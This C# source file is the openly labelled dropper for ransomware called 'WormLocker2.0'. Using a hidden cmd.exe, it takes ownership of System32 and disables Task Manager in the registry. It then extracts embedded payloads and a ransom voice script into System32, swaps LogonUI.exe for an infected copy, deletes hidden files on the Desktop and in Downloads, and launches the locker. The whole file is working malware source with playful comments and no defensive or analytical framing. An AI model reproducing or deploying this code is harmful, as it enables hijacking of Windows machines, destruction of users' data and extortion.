using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

/*
Why this file? This file allows you to allow editing
of system files in the System32 folder, extracts 
ransomware and ransom_voice. This file is not encrypted, 
because if it is, this file will crash. We must first extract and then encrypt ;)
Extracts LogonUI.exe, Worm Locker2.0.exe, ransom_voice.vbs
 */
namespace SysWOW64
{
    public partial class Worm_patch : Form
    {
        public Worm_patch()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor; //Make invisible
            TopMost = true; //Make the program in the foreground
            this.Opacity = 1; //It's not necessary, but for sure :D

            const string quote = "\""; //Important.DO NOT CHANGE!!!
            
            //Obtain permission for the System32 folder
            ProcessStartInfo logoninf = new ProcessStartInfo();
            logoninf.FileName = "cmd.exe";
            logoninf.WindowStyle = ProcessWindowStyle.Hidden;
            logoninf.Arguments = @"/k takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant " + quote + "%username%:F" + quote;
            Process.Start(logoninf);

            //Turn off task manager
            RegistryKey rk2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk2.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);

        }

        private void Worm_patch_Load(object sender, EventArgs e)
        {   
            cmd_get.Start(); //Extract files, modify logonUI, delete hidden files and desktop.ini
            tmr_start_worm.Start(); //Start ransomware
        }

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //Important.DO NOT CHANGE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
            w.Write(r.ReadBytes((int)s.Length));
        }

        private void cmd_get_Tick(object sender, EventArgs e)
        {
            cmd_get.Stop();

            //Path for DownloadFolder
            string userRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string downloadFolder = Path.Combine(userRoot, "Downloads");
            string filedl = (downloadFolder);

            Extract("SysWOW64", "C:\\Windows\\System32", "Script", "LogonUIinf.exe"); //Extract
            Extract("SysWOW64", "C:\\Windows\\System32", "Script", "ransom_voice.vbs"); //Extract
            Extract("SysWOW64", "C:\\Windows\\System32", "Script", "WormLocker2.0.exe"); //Extract
            File.Copy("C:\\Windows\\System32\\LogonUI.exe", "C:\\Windows\\System32\\LogonUItrue.exe"); //Copy uninfected logonui.exe to logonuitrue.exe
            File.Delete("C:\\Windows\\System32\\LogonUI.exe"); //delete logonui.exe
            File.Copy("C:\\Windows\\System32\\LogonUIinf.exe", "C:\\Windows\\System32\\LogonUI.exe"); //Copy logonuiinf.exe to logonui.exe

            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); //define for desktop path
            //Delete all hidden files on desktop because we cant encrypt hidden files :-(
            string[] filesPaths = Directory.EnumerateFiles(path + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            foreach (string file2 in filesPaths)
                File.Delete(file2);

            string path2 = filedl; //define for desktop path
            //Delete all hidden files on desktop because we cant encrypt hidden files :-(
            string[] filesPaths2 = Directory.EnumerateFiles(path2 + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            foreach (string file3 in filesPaths2)
                File.Delete(file3);
        }

        private void tmr_start_worm_Tick(object sender, EventArgs e)
        {
            tmr_start_worm.Stop();
            Process.Start(@"C:\Windows\System32\WormLocker2.0.exe"); //Start Ransomware
            this.Close(); //Close the extractor
            Application.Exit(); //Close the extractor

        }
    }
}
